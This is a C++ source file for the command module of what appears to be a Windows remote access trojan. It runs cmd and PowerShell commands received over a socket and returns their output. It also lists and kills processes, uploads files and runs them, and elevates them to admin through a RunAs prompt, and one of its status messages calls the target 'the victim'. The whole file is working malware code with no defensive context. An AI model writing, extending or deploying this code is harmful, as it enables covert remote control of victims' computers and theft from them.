#include "Shell.h"
#define FILE_TMP "cmd.tmp"
#define BUFFER_LEN 256
#define HUGE 16384

std::string Shell::return_command(const std::string cmd)
{
	std::string rcmd = cmd + " > " + FILE_TMP;
	system(rcmd.c_str());
	std::ifstream file(FILE_TMP, std::ios::in);

	if (file)
	{
		std::string return_c;
		std::string line;
		while (getline(file, line))
		{
			return_c += line+"\n";
		}
		file.close();
		std::string erase = "ERASE " + std::string(FILE_TMP);
		system(erase.c_str());
		return return_c;
	}
	else
	{
		return ("Error using the command : " + cmd);
	}
}

void Shell::pwd(SOCKET* client)
{
	char buffer[BUFFER_LEN] = { 0 };
	_getcwd(buffer, BUFFER_LEN);
	send(*client, buffer, BUFFER_LEN, 0);
}
void Shell::ls(SOCKET* client)
{
	std::string ret = return_command("dir /b");
	send(*client, ret.c_str(), ret.size(),0);
}
void Shell::runCMD(SOCKET* client,const std::vector<std::string> args)
{
	std::string cmd;
	for (int iargs = 1; iargs < args.size(); iargs++)
	{
		cmd=cmd+args[iargs]+" ";
	}
	std::string ret = Shell::return_command(cmd);
	std::cout << ret << std::endl;
	send(*client, ret.c_str(), ret.size(), 0);
}
void Shell::runPOWERSHELL(SOCKET* client, const std::vector<std::string> args)
{
	std::string cmd = "powershell ";
	for (int iargs = 1; iargs < args.size(); iargs++)
	{
		cmd = cmd + args[iargs] + " ";
	}
	std::string ret = Shell::return_command(cmd).c_str();
	send(*client, ret.c_str(), ret.size(), 0);
}
void Shell::cd(Client* client, const std::string directory)
{
	int ret = _chdir(directory.c_str());
	if (ret == -1)
	{
		client->send_b(("Unable to find directory : " + directory).c_str());
	}
	else if (ret == 0)
	{
		char buffer[BUFFER_LEN] = { 0 };
		_getcwd(buffer, BUFFER_LEN);
		client->send_b(("Directory changed to : " + std::string(buffer)).c_str());
	}
}

void Shell::uploadToClientExe(Client* client, std::string filename)
{
	if (Transfer::uploadToClient(client, filename))
	{
		client->send_b(std::string("Upload done, now starting " + filename+" ...").c_str());
		Shell::exe(client, filename);
		client->send_b("Done");
	}
}

void Shell::exeAdmin(Client* client,const std::string filename)
{
	client->send_b(("Starting in admin mode " + filename).c_str());
	const std::string cmd = "powershell Start-Process " + filename + " -Verb RunAs";
	std::string ret = Shell::return_command(cmd);
	if (ret != ""){send(*client->getSock(), ret.c_str(), BUFFER_LEN, 0);}
	else
	{
		client->send_b("The victim has accepted to execute in admin mode");
	}
	client->send_b("Done");
}
void Shell::exe(Client* client, const std::string filename)
{
	client->send_b(("Starting " + filename).c_str());
	const std::string cmd = "start " + filename;
	std::string ret = Shell::return_command(cmd);
	if (ret != "") { send(*client->getSock(), ret.c_str(), BUFFER_LEN, 0); }
	client->send_b("Done");
}

void Shell::ps(Client* client)
{
	std::string ret = Shell::return_command("tasklist");
	std::cout << ret << std::endl;
	send(*client->getSock(), ret.c_str(), ret.size(), 0);
}
void Shell::kill(Client* client, const std::vector<std::string> args)
{
	if (args[1] == "-p")
	{
		client->send_b(std::string("Killing process with PID : " + args[2]).c_str());
		std::string ret = Shell::return_command("taskkill /F /PID " + args[2]);
		if (ret != "")
		{
			send(*client->getSock(), ret.c_str(), BUFFER_LEN, 0);
		}
		client->send_b("Done");
	}
	else if (args[1] == "-n")
	{
		client->send_b(std::string("Killing process with name : " + args[2]).c_str());
		std::string ret = Shell::return_command("taskkill /IM " + args[2] + " /F " + args[2]);
		if (ret != "")
		{
			send(*client->getSock(), ret.c_str(), BUFFER_LEN, 0);
		}
		client->send_b("Done");
	}
	else
		client->send_b("Unknown parameters...");
}

